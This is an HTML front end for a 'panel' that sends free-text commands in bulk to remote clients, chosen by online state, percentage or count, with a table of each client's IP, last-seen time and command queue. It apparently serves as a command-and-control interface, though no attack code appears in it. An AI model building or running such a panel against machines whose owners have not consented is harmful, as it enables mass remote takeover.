<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>panel</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <header>
    <h1>panel</h1>
    <span id="count" class="count"></span>
    <a class="logout" href="/logout">logout</a>
  </header>

  <section class="targeting">
    <div class="seg" role="tablist" aria-label="scope">
      <button data-of="all" class="active">all</button>
      <button data-of="online">online</button>
      <button data-of="offline">offline</button>
    </div>

    <div class="seg" role="tablist" aria-label="mode">
      <button data-mode="all" class="active">everyone</button>
      <button data-mode="percent">%</button>
      <button data-mode="count">#</button>
    </div>

    <input id="amount" type="number" min="0" placeholder="60" disabled />

    <input id="bulk-cmd" type="text" placeholder="command…" autocomplete="off" maxlength="4096" />

    <button id="send" class="primary">send</button>
    <span id="bulk-msg" class="msg"></span>
  </section>

  <section class="filters">
    <button data-filter="all" class="active">all</button>
    <button data-filter="online">online</button>
    <button data-filter="offline">offline</button>
  </section>

  <table id="clients">
    <thead>
      <tr>
        <th>name</th>
        <th>ip</th>
        <th>state</th>
        <th>last seen</th>
        <th>command</th>
        <th>queue</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

  <p id="empty" class="empty">no clients</p>

  <script src="/app.js"></script>
</body>
</html>
